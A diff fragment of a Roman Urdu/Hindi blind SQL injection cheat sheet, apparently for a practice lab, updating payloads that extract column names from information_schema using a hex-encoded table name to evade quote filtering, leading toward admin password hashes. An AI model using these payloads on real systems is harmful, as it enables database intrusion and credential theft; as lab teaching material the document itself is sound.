@@ -293,13 +293,15 @@ Rule: Burp Suite Repeater mein payload daalne ke baad space aur # wali line ko h
 
 ### Finding Column Name Length
 
-`id=1 AND LENGTH((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1))=4#`
+`id=1 AND LENGTH((SELECT column_name FROM information_schema.columns WHERE table_name=0x7573657273 LIMIT 0,1))=7#`
+
+**`0x7573657273` Hex version hai user-ir table ka, kiunky medium blind SQLi pr single quotes ' accept nhi hoty iss liye yeh Hex version use kiya phir isko Ctrl+U sy daba kr aik baar encode kr ky send krna hai**
 
 **(Pehle column ke liye LIMIT 0,1, doosre column ke liye LIMIT 1,1 use karein).**
 
 ### Column Name Character-by-Character Extract
 
-`id=1 AND SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1), 1, 1)='u'#`
+`id=1 AND ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name=0x7573657273 LIMIT 0,1), 1, 1))=117#`
 
 ### Finding Admin Password Hash Length
 
